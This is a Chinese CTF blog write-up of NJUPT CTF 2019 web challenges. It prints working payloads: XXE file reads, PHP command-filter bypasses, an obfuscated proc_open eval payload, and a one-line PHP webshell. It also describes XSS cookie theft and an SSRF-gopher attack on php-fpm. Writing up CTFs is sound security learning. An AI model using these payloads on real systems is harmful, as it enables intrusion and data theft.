<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.5.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.5.0" type="image/png" sizes="32x32"><meta name="google-site-verification" content="QDXQenTtxQ6MwW-M_7k9lw39Kq7F4pwFO0u1QAPYlDE"><meta name="description" content="前言       去年刚开始打 CTF 的时候，打的第一个就是南邮的比赛 &#x3D; &#x3D; 签到签了一天。一个晨跑打卡题 SQL 注入，空格的绕过，也没做出来。当时打完直接自闭。到了今年, Web 就一道题 flask_website 属于知识盲区，因为 flask 框架没学过。会存在什么安全隐患不清楚。其他题目思路上都没问题。">
<meta property="og:type" content="article">
<meta property="og:title" content="NJUPT_CTF_2019_Web_Writeup">
<meta property="og:url" content="http://www.7ten7.top/2019/11/25/2019-11-25-NJUPT_CTF_2019_Web_Writeup/index.html">
<meta property="og:site_name" content="7TEN7&#39;s Blog">
<meta property="og:description" content="前言       去年刚开始打 CTF 的时候，打的第一个就是南邮的比赛 &#x3D; &#x3D; 签到签了一天。一个晨跑打卡题 SQL 注入，空格的绕过，也没做出来。当时打完直接自闭。到了今年, Web 就一道题 flask_website 属于知识盲区，因为 flask 框架没学过。会存在什么安全隐患不清楚。其他题目思路上都没问题。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2019-11-24T16:00:00.000Z">
<meta property="article:modified_time" content="2020-04-23T12:57:12.369Z">
<meta property="article:author" content="7TEN7">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary"><title>NJUPT_CTF_2019_Web_Writeup | 7TEN7's Blog</title><link ref="canonical" href="http://www.7ten7.top/2019/11/25/2019-11-25-NJUPT_CTF_2019_Web_Writeup/"><link rel="alternate" href="/atom.xml" type="application/atom+xml"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.5.0"><script src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" data-ad-client="ca-pub-4793862971469188" async=""></script><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"simple","highlight":"ocean","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: true,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">NJUPT_CTF_2019_Web_Writeup</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2019-11-25</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">2.5k</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">阅读时长</span><span class="post-meta-item__value">18分</span></span></div></header><div class="post-body">
        <h1 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h1>
      <p>去年刚开始打 CTF 的时候，打的第一个就是南邮的比赛 = = 签到签了一天。一个晨跑打卡题 SQL 注入，空格的绕过，也没做出来。当时打完直接自闭。到了今年, Web 就一道题 flask_website 属于知识盲区，因为 flask 框架没学过。会存在什么安全隐患不清楚。其他题目思路上都没问题。<a id="more"></a></p>

        <h1 id="Fake-XML-cookbook"   >
          <a href="#Fake-XML-cookbook" class="heading-link"><i class="fas fa-link"></i></a>Fake XML cookbook</h1>
      <p>这题最简单的XXE，没什么套路。直接读根目录下的flag既可。</p>
<p>payload如下</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">	&lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;name;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></div></figure>

        <h1 id="True-XML-cookbook"   >
          <a href="#True-XML-cookbook" class="heading-link"><i class="fas fa-link"></i></a>True XML cookbook</h1>
      <p>这题同样是XXE，但再次尝试读取根目录下的 /flag 发现读取不到东西，此时尝试读取其他敏感文件获取目标内网的信息。</p>
<ul>
<li><strong>/etc/hosts</strong>  </li>
<li><strong>/proc/net/arp</strong> （arp缓存文件）</li>
</ul>
<p>发现，读取 /proc/net/arp 文件发现登录主机IP，但其中只有 192.168.1.8 和192.168.1.1的MAC地址不为 00:00:00:00:00:00，其中主机号为1的IP一般为网关，所以尝试使用 http 协议对 192.168.1.8 进行端口探测。在准备探测前随手访问了下 192.168.1.8 的 80端口，结果就拿到 flag了….</p>
<p><span class="exturl"><a class="exturl__link"   href="https://xz.aliyun.com/t/3357#toc-13"  target="_blank" rel="noopener">参考文章</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="easyphp"   >
          <a href="#easyphp" class="heading-link"><i class="fas fa-link"></i></a>easyphp</h1>
      <p>题目源码如下：</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line">$cmd = $_GET[<span class="string">'q_w_q'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3rd</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd);</span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">23333333</span></span><br></pre></td></tr></table></div></figure>
<p>其中 1st 使用 %0a 换行符，既可绕过</p>
<p>2nd 其实考的还是 PHP 的弱比较问题。其中 <strong>$a == $b</strong> 的话是弱比较，如果 0e开头，之后为数字的话，那么会被当成科学计数法。所以就是相等的。</p>
<p><strong>$md5_1 != $md5_2</strong> ，能想到的应该就是找0e开头的md5值。其中 <strong>$string_1</strong> 需要是数字或者数字字符串，所以我们可以爆破，找一个MD5之后为0e开头的数字，但它后30位不是全为数字，但其中又只包含，chxp 这4个字母，这样经过 <strong>strtr</strong>的替换，后30位又全部是数字，这样就满足了 <strong>$a==$b</strong> 。</p>
<p>找数字的爆破脚本如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;=<span class="number">100000000000000000000</span>;$i++)&#123;</span><br><span class="line">	$a = md5($i);</span><br><span class="line">	<span class="keyword">if</span>(strpos($a,<span class="string">'0e'</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">		$b = substr($a,<span class="number">2</span>,<span class="number">30</span>);</span><br><span class="line">		$c = strtr($b, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">		<span class="keyword">if</span>(strpos($c,<span class="string">'e'</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(is_numeric($c))&#123;</span><br><span class="line">				<span class="keyword">echo</span> $i;</span><br><span class="line">				<span class="keyword">exit</span>();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>这样可以得到数字 2120624 ，MD5之后的值为 <strong>0e85776838554cc1775842c212686416</strong>，经过 <strong>strtr</strong> 之后，值为 <strong>0e857768385540017758420212686416</strong> 。另一个值，因为没有类型限制，所以我们随便传入一个MD5之后为0e开头且后30位为纯数字的。例如： 240610708</p>
<p>这样 str1 和 str2 分别传入 2120624 和 240610708 既可绕过 2nd</p>
<p>3rd 中 <strong>substr_count($query, ‘_’) === 0 &amp;&amp; substr_count($query, ‘%5f’) === 0</strong> 这里利用到了php的一个特性，</p>
<p> 如果参数名字中包含” “、”.”、”[“ 这几个字符，会将他们转换成下划线。 <a href="[https://www.lhaihai.wang/post/2018%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E6%9C%88%E8%B5%9Bwriteup/](https://www.lhaihai.wang/post/2018安恒五月月赛writeup/">参考文章</a> )</p>
<p>所以这里q_w_q 使用 q.w.q 替代既可。</p>
<p>直接 ls 列目录，发现flag在 flllag.php 中，然后这里 cat 被过滤以及限制了长度，但使用 <strong>ca\t  f* </strong> 既可绕过。</p>

        <h1 id="replace"   >
          <a href="#replace" class="heading-link"><i class="fas fa-link"></i></a>replace</h1>
      <p>一开始想到的函数的 str_replace，印象中这个函数真的没什么问题。google一番也没什么发现。后来在 rep参数多输入了一个 ) 后发现报错了，爆出了函数是 preg_replace ,是这个函数就想到了是命令执行了。</p>
<p>但这里单引号被过滤了，以及命令执行函数被过滤了，所以不能直接调用系统命令来读取文件和列目录，但可以使用 php函数来做这些事情。</p>
<ul>
<li><p>var_dump(scandir(chr(47)))  列出根目录。</p>
</li>
<li><p>var_dump(file(chr(47).chr(102).chr(108).chr(97).chr(103))) 读取flag</p>
</li>
</ul>

        <h1 id="Upload-your-Shell"   >
          <a href="#Upload-your-Shell" class="heading-link"><i class="fas fa-link"></i></a>Upload your Shell</h1>
      <p>界面很华丽，是文件包含和文件上传的一个组合。</p>
<p>检测MIME和文件后缀名，以及文件内容是否包含 &lt;? 。这里可以使用图片马，把图片马中的一句话改为 <script language=php>@eval($_POST[1])</script> 既可</p>

        <h1 id="hacker-backdoor"   >
          <a href="#hacker-backdoor" class="heading-link"><i class="fas fa-link"></i></a>hacker_backdoor</h1>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'useful'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">$usrful = $_GET[<span class="string">'useful'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">    $dangerous = get_defined_functions();</span><br><span class="line">    array_push($dangerous[<span class="string">"internal"</span>], <span class="string">'eval'</span>, <span class="string">'assert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($dangerous[<span class="string">"internal"</span>] <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($a,$bad) !== <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists($usrful))&#123;</span><br><span class="line">    <span class="keyword">if</span>(waf($code))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($code);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"oh,不能输入这些函数哦 :) "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>file_exists 这个检测并不影响，直接传入index.php 既可</p>
<p>waf() 函数可以用 . 来凭借字母然后执行动态函数。例如执行phpinfo()。$a=’p’.’h’.’p’.’i’.’n’.’f’.’o’;$a();</p>
<p>查看 phpinfo 的 disable_functions可以发现大量函数被禁用了。命令执行函数 proc_open 未被过滤，所以我们可以利用这个函数来进行对flag的读取。</p>
<p>最后完整 payload 为</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;nctf2019.x1ct34m.com:60004&#x2F;?code&#x3D;?&gt;&lt;?php $b&#x3D;&quot;p&quot;;$c&#x3D;&quot;ipe&quot;;$test&#x3D;&quot;&#x2F;readflag&quot;;$g&#x3D;&#39;c&#39;.&#39;h&#39;.&#39;r&#39;;$h&#x3D;$g(95);$a&#x3D;[[$b.$c,&quot;r&quot;], [$b.$c,&quot;w&quot;], [$b.$c,&quot;w&quot;] ];$aa&#x3D;&#39;p&#39;.&#39;r&#39;.&#39;o&#39;.&#39;c&#39;.$h.&#39;o&#39;.&#39;p&#39;.&#39;e&#39;.&#39;n&#39;;$fp&#x3D;$aa($test,$a,$p); $d&#x3D;&#39;stre&#39;.&#39;am&#39;.$h.&#39;ge&#39;.&#39;t&#39;.$h.&#39;c&#39;.&#39;o&#39;.&#39;n&#39;.&#39;t&#39;.&#39;e&#39;.&#39;n&#39;.&#39;t&#39;.&#39;s&#39;;echo $d($p[1]);?&gt;&amp;useful&#x3D;index.php</span><br></pre></td></tr></table></div></figure>

        <h1 id="simple-xss"   >
          <a href="#simple-xss" class="heading-link"><i class="fas fa-link"></i></a>simple_xss</h1>
      <p>注册登录，可以给指定的用户留言。然后留言这里存在XSS，并且没什么过滤。直接给admin留言，然后利用xss平台来盗取admin的cookie。</p>
<p>思路是这样，但我操作的时候遇到个问题就是留言完之后没有马上收到cookie，过了好久去xss平台上看了眼，发现突然有几个cookie。拿其中一个来进行替换，结果就拿到flag了….</p>

        <h1 id="flask"   >
          <a href="#flask" class="heading-link"><i class="fas fa-link"></i></a>flask</h1>
      <p>flag 的模板注入，过滤了 flag 关键字。利用 jinja 的 reverse 过滤器既可绕过。</p>

        <h1 id="phar-matches-everything"   >
          <a href="#phar-matches-everything" class="heading-link"><i class="fas fa-link"></i></a>phar matches everything</h1>
      <p>看到 phar 我就想到了 phar 序列化，但看这题一直没人解出来，我就没看，先把其他解出来的人比较多的题目给解了。然后到了快结束了的最后几个小时看了下。</p>
<p>一开始题目提示 vim。想到了源码泄露，但用扫描器扫了下没收获。以为可能是利用反序列化+PHP原生类来进行任意文件读取。然后往这个思路去做。发现并行不通。</p>
<p>之后自己给每个php文件之后加上 .swp 之后，突然发现下载了 .catchmime.php.swp 下来，放到 vim 中 -r 恢复出来。得到以下源码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
<p>getimagesize 函数，加上定义了，但是源码中没有实例化的类。明显是留着给我们利用的。那第一步的思路就很清晰了。利用phar反序列化，执行 Main 类的 curl方法。curl 方法的话，很明显是一个 SSRF。</p>
<p>在讲利用前先说了这里踩的一个坑，调试了我一个多小时。<strong>$this_is_a_easy_test-&gt;funny_get() === ‘1’</strong> 这里要让<strong>Easytest</strong> 的 <strong>$test</strong> 属性为 ‘1’ 。在序列化受保护的成员属性时，会在属性名前面加上 <strong>‘ * ‘</strong> 这个星号两侧是有两个空字节。但这个空字节输出到浏览器上是不显示的。所以在传入的时候，两个空字节用%00代替。好久没遇到序列化，忘记了这个点，真是惭愧。</p>
<p>言归正传。这么触发 phar 反序列化这里就不叙述了，我之前文章总结过了。讲下SSRF利用，这里一开始想到的是进行本地文件读取。但是读了一圈下来，都没读到 flag。</p>
<p>最后根据 XXE 的思路可能需要使用 SSRF 打内网的机器。这里同样读取 /proc/nat/arp 获取一个内网IP地址，10.0.0.3 ，利用SSRF进行访问，得到提示。 powered by good PHP-FPM 。第一反应是不久前刚爆出的 CVE-2019-11043。</p>
<p>但搜索了一圈只有一个 POC 脚本，这里利用SSRF是无法使用的。所以暂时没什么好的解决办法。</p>
<p>最后比赛结束了。也没找到解决的办法。赛后看了其他师傅的 wp 才明白，原来这里是利用 SSRF + gopher 协议打 php-fpm 未授权访问。</p>
<p>赛后复现的过程中，又踩坑了。我本地环境测试生成的payload有没有效，在浏览器中测试，页面一直加载。然后我就一直卡在这里，以为是我的payload有问题，之后通过 php 命令直接执行文件，发现正常，然后拿到题目上测试，也正常，说明 payload 没问题。这里不知道什么问题，卡了好久（哭）。生成 gopher 协议 payload 的脚本<a href="[https://evoa.me/index.php/archives/52/#toc-php-fpm%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E](https://evoa.me/index.php/archives/52/#toc-php-fpm未授权漏洞">参考这里</a> ) 。</p>
<p>最后还需要绕过 open_basedir 。<span class="exturl"><a class="exturl__link"   href="https://xz.aliyun.com/t/4720"  target="_blank" rel="noopener">参考文章</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p>
<p>剩下两题 SQLi 和  flask_website 没做出来，就不写了。</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://www.7ten7.top">7TEN7</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://www.7ten7.top/2019/11/25/2019-11-25-NJUPT_CTF_2019_Web_Writeup/">http://www.7ten7.top/2019/11/25/2019-11-25-NJUPT_CTF_2019_Web_Writeup/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://www.7ten7.top/tags/CTF/">CTF</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" 